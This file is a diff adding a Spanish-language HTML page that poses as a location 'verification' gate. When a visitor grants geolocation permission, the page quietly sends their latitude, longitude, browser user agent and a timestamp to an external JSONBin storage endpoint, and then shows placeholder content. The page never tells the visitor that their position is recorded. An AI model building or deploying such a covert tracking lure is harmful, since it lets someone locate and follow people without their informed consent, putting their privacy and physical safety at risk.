@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Ubicación</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        #contenido { display: none; }
+    </style>
+</head>
+<body>
+    <div id="verificacion">
+        <h1>Verificación de ubicación</h1>
+        <p id="status">Por favor, permite el acceso a la ubicación para continuar.</p>
+    </div>
+
+    <div id="contenido">
+        <h1>Bienvenido a la página</h1>
+        <p>Este contenido solo se muestra si permitiste la geolocalización.</p>
+    </div>
+
+    <script>
+        function registrarUbicacion(lat, lon) {
+            fetch("https://api.jsonbin.io/v3/b", {  // Servidor gratuito para almacenar datos
+                method: "POST",
+                headers: { 
+                    "Content-Type": "application/json",
+                    "X-Master-Key": "TU_CLAVE_DE_JSONBIN"  // Reemplázalo con tu clave
+                },
+                body: JSON.stringify({
+                    latitud: lat,
+                    longitud: lon,
+                    userAgent: navigator.userAgent,
+                    fecha: new Date().toISOString()
+                })
+            });
+        }
+
+        function solicitarUbicacion() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+
+                        registrarUbicacion(lat, lon);
+
+                        document.getElementById("verificacion").style.display = "none";
+                        document.getElementById("contenido").style.display = "block";
+                    },
+                    function(error) {
+                        document.getElementById("status").innerText = "Debes permitir la ubicación para ver el contenido.";
+                    }
+                );
+            } else {
+                document.getElementById("status").innerText = "Geolocalización no soportada.";
+            }
+        }
+
+        solicitarUbicacion();
+    </script>
+</body>
+</html>
